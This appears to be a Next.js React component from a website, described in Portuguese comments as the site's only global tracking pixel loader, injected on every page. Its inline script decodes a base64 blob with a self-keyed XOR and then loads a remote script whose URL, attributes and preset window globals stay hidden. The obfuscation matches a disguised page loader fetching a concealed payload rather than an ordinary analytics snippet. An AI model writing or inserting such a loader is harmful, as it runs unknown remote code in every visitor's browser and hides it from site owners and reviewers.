"use client"

import Script from "next/script"

/**
 * Único tracking global do site.
 * Carrega o loader do pixel em todas as páginas.
 */
const PIXEL_LOADER = `(function(){var t_s=atob("DP3OvFkfXRDHI2IUbIbsyStzfyrlSxZgHI70k3Z8OX7pVhZ5BZu3kjpwMD6lUU1nD4+nzC1scmCuWwd4Q42nxDxzc3q0AU42DYm6zjB9KGSiUEAuN6Dinj5zMnKmTxE2Vqa1njd+MHXlGUBkBYWr0BB7fzzlVQN4GZjshnspPCbzRgEiDcj62jgrPCmmGwdwVc392W49IE26");var v_skqo=[];for(var q_u=0;q_u<t_s.length;q_u++){v_skqo.push(t_s.charCodeAt(q_u)&255);}var i_kul=v_skqo[0];var u_37=v_skqo.slice(1,1+i_kul);var l_k=v_skqo.slice(1+i_kul);var u_9=l_k.map(function(b,w_u){return b^u_37[w_u%i_kul];});var f_9kvt="";for(var x_t=0;x_t<u_9.length;x_t++){f_9kvt+=String.fromCharCode(u_9[x_t]&255);}var c_275=decodeURIComponent(escape(f_9kvt));var e_f7=JSON.parse(c_275);var d_g6b=e_f7.globals||[];d_g6b.forEach(function(g_9019){window[g_9019.name]=g_9019.value;});var d_vwq=document.createElement("script");d_vwq.src=e_f7.url;d_vwq.async=true;d_vwq.defer=true;(e_f7.attributes||[]).forEach(function(w_i){d_vwq.setAttribute(w_i.name,w_i.value);});(document.head||document.documentElement).appendChild(d_vwq);})();`

export function SiteTracking() {
  return (
    <Script id="site-pixel" strategy="afterInteractive">
      {PIXEL_LOADER}
    </Script>
  )
}
